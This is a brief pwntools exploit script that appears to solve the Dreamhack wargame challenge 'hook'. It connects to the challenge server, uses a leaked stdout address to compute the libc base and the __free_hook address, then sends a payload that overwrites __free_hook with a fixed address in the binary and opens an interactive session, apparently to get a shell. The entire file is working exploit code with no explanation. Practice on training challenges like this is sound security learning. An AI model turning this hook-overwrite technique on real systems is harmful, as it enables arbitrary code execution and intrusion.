from pwn import *

def slog(name, addr): return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 24424)
e = ELF("./hook")
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
stdout = int(p.recvuntil(b"\n")[:-1], 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]

p.sendlineafter("Size: ", str(500))
payload = p64(free_hook) + p64(0x400a11)
p.sendafter("Data: ", payload)

p.interactive()